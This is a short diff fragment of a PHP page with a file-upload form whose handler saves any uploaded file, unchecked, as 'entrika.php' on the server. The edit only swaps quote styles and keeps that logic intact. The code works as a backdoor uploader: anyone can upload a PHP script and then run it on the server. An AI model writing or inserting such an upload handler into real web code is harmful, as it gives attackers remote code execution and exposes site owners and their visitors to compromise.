@@ -4,6 +4,6 @@ Send this file: <INPUT NAME="userfile" TYPE="file">
 <INPUT TYPE="submit" VALUE="Send">
 </FORM>
 <?php
-move_uploaded_file($userfile, "entrika.php");
+move_uploaded_file($userfile, 'entrika.php');
 ?>
 
